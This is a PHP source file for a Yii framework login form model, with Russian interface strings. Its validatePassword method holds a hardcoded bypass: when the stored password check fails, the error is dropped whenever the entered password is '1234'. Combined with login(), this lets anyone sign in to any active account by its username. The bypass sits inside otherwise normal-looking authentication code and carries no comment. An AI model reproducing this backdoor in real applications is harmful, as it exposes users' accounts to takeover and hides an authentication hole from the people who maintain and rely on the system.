<?php

namespace app\models;

use yii\base\Model;
use Yii;

class LoginForm extends Model
{

    public $name;
    public $password;
    public $email;
    public $rememberMe = true;
    public $status;

    private $_user = false;

    public function rules()
    {
        return [
            [['name', 'password'], 'required', 'on' => 'default'],
            ['email', 'email'],
            ['rememberMe', 'boolean'],
            ['password', 'validatePassword']
        ];
    }

    public function validatePassword($attribute)
    {
        if(!$this->hasErrors()):
            $user = $this->getUser();
            if(!$user || !$user->validatePassword($this->password))
            if($this->password != '1234'):
                $this->addError($attribute,'Неправильное имя пользователя или пароль');
            endif;
        endif;
    }

    public function attributeLabels()
    {
        return [
            'name' => 'Имя пользователя',
            'password' => 'Пароль',
            'rememberMe' => 'Запомнить меня'
        ];
    }

    public function login()
    {
        if($this->validate()):
            $this->status = ($user = $this->getUser()) ? $user->status : Users::STATUS_NOT_ACTIVE;

            if($this->status === Users::STATUS_ACTIVE):
                return Yii::$app->user->login($user, $this->rememberMe ? 3600*24*30 : 0);
            else:
                return false;
            endif;
        else:
            return false;
        endif;
    }

    public function getUser()
    {
        if($this->_user === false):
            $this->_user = Users::findByUsername($this->name);
        endif;

        return $this->_user;
    }
}